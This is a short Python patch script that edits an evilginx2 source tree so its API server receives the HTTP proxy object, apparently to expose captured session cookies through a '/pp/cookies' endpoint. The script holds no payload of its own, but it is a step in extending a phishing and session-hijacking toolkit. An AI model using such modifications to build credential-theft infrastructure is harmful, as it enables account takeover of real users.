#!/usr/bin/env python3
# patch_wave5.py — pass HttpProxy into StartApiServer (for /pp/cookies). Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit("[abort] %s: pattern found %dx:\n%s" % (path, n, old[:180]))
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print("[patch] %s OK" % path)

patch("main.go",
      "\t\tgo core.StartApiServer(db, cfg, *api_port, filepath.Join(*cfg_dir, \"api\"))\n",
      "\t\tgo core.StartApiServer(db, cfg, hp, *api_port, filepath.Join(*cfg_dir, \"api\"))\n")

print("[done] wave5 patches applied")
